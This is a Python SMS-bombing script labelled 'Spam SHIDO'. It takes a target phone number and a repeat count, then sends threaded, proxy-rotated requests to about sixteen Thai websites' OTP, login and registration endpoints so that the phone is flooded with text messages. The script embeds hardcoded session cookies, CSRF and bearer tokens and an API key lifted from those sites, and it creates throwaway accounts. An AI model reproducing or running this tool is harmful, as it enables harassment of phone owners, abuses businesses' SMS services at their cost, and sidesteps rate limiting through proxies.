import requests,json
import threading
from requests import post,Session
import time
import random
import datetime
import requests as ru
import requests,os,sys,threading
from requests import post
from re import search
from bs4 import BeautifulSoup as bs
from pystyle import Colors, Colorate

#os.system("clear")
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"กำลังเริ่มทำงานโดยชิโด้"))
time.sleep(3.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁  "))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ "))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ "))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄"))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅"))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆"))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
time.sleep(1)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"╔----------------⋐🅂🄷🄸🄳🄾⋑-----------------╗"))
print(Colorate.Horizontal(Colors.blue_to_purple,"""
        ╔═════════════════════════╗
                 𝙎𝙥𝙖𝙢 𝙎𝙃𝙄𝘿𝙊        
"""))
print(Colorate.Horizontal(Colors.blue_to_purple,"        ╚═════════════════════════╝"))
print(Colorate.Horizontal(Colors.blue_to_purple,"╚------------⋐𝐵𝑌 🆂︎🅷︎🅸︎🅳︎🅾︎#2549⋑------------╝"))
print("")
print(Colorate.Horizontal(Colors.blue_to_purple,"                  [15API]        "))
print("")
print(Colorate.Horizontal(Colors.blue_to_purple,"¼ ½ ¾  ⅓ ⅔ ⅕ ⅖ ⅗ ⅘ ⅙ ⅚ ⅛ ⅜ ⅝ ⅞¼ ½ ¾  ⅓ ⅔ ⅕ ⅓   "))
print("")

phone = input(f"\033[1;34m  [+][Phone🔴]:\033[1;35m ")
num = int(input(f"\033[1;34m  [+][Nuber🟢] :\033[1;35m"))
time.sleep(0.5)



def api1():
	send = Session()
	send.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
	sms = send.post("https://api.jobbkk.com/v1/easy/otp_code",data="mobile="+phone,proxies={'http': 'http://' + random.choice(s)})
	
def api2():
	 requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4},proxies={'http': 'http://' + random.choice(s)})
	
def api3():
	 requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})
	
def api4():
	 requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.760",headers={"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"},proxies={'http': 'http://' + random.choice(s)})
	
def api5(): 
    post('https://api.baccaratth.com/api/v1/sendotp', data = {'phone_number': phone})
	
def api6():
	 requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
	
def api7():
	 requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone},proxies={'http': 'http://' + random.choice(s)})
	
def api8():
	 requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}",proxies={'http': 'http://' + random.choice(s)})
	
def api9():
	 requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone},proxies={'http': 'http://' + random.choice(s)})
	
def api10():
	 requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",proxies={'http': 'http://' + random.choice(s)})
	
def api11():
	 requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	
	
def api12():
	 requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})
	
def api13():
	 requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})
	
def api14():
	 requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",proxies={'http': 'http://' + random.choice(s)})
	
def api15():
	 requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
def call1():
	requests.post("https://1ufa.bet/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "U5doBrJJ5u91294kDU40Z_KrdPLTcfNQ5J3MhDsyg8M"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36","Content-Type": "application/x-www-form-urlencoded","cookie": "_gid=GA1.2.1736081460.1679951032; PHPSESSID=0j2uoh0oesv4ngaopas52ug8gk; _raw_ref=https%3A%2F%2F1ufa.bet%2F; _ga=GA1.2.1166363420.1679951032; _ga_5148MHRV47=GS1.1.1679951031.1.1.1679952029.0.0.0"})

for i in range(num):
  threading.Thread(target=api1).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫1"""))
  threading.Thread(target=api2).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫2"""))
  threading.Thread(target=api3).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫3"""))
  threading.Thread(target=api4).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫4"""))
  threading.Thread(target=api5).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫5"""))
  threading.Thread(target=api6).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫6"""))
  threading.Thread(target=api7).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫7"""))
  threading.Thread(target=api8).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫8"""))
  threading.Thread(target=api9).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫9"""))
  threading.Thread(target=api10).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫10"""))
  threading.Thread(target=api11).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫11"""))
  threading.Thread(target=api12).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫12"""))
  threading.Thread(target=api13).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫13"""))
  threading.Thread(target=api14).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫14"""))
  threading.Thread(target=api15).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫15"""))
  threading.Thread(target=call1).start()
  print(Colorate.Horizontal(Colors.blue_to_purple,"""🟢SMS-ASMXD🔫+call1"""))